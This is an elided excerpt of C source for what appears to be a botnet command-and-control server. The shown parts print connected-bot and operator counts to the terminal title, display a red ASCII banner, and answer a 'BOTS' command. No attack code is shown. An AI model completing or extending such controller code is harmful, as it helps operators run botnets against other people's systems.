...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0;BOT COUNT: %d| MASTERS: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(ascii_banner_line1, "\x1b[31m _¯¯¯¯_   _¯¯¦____  _¯¯_ ¦  _¯¯_¯¯¯_  _¯¯¯¯_   _¯¯_ _¯_\r\n");
		sprintf(ascii_banner_line2, "\x1b[31m¦     _¯ ¦  _¯   ¦ ¦  ¦ _¯ ¦   ¦   ¦ ¦      ¦ ¦  ¦ ¯  ¦\r\n");
		sprintf(ascii_banner_line3, "\x1b[31m¦ __¯¯     ¦_____  ¦  ¦¯_  ¦  ¦¯¯¦¯  ¦      ¦ ¦  ¦    ¦\r\n");
		sprintf(ascii_banner_line4, "\x1b[31m  ¦        ¦    ¦    ¦   ¦  _¯    ¦  ¯_    _¯   ¦    ¦ \r\n");
		sprintf(ascii_banner_line5, "\x1b[31m   ¯____¯ _¯____   _¯   ¦  ¦     ¦     ¯¯¯¯   _¯   _¯  \r\n");
		...
		{
			if(strstr(buf, "BOTS")) {
				sprintf(botcount, "BOT COUNT: %d | MASTERS: %d\r\n", BotsConnected(), OperatorsConnected);
